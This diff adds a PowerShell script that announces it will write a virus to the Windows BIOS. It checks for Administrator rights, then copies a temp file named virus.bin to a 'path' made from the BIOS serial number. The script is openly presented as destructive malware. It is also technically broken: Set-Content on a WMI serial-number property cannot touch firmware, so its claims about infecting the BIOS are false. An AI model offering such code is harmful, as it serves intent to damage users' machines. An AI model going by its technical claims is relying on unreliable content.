@@ -1,0 +1,5 @@
+
+
+Write-Host "This script will write a virus to the Windows System BIOS" <# 
+The following code will check for Administrator rights, then write a malicious file to the computer's system BIOS. 
+It is important to note that a BIOS virus can potentially cause irreparable damage to the system, so use this script with caution. #> If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { 	Write-Warning "You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator!" 	Break } $BIOSPath = Get-WmiObject win32_bios | Select-Object -Property SerialNumber $VirusFile = "$env:temp\virus.bin" $biosContent = Get-Content -Path $VirusFile Set-Content -Path $BIOSPath -Value $biosContent Write-Host "FINISHED WRITING VIRUS TO BIOS."
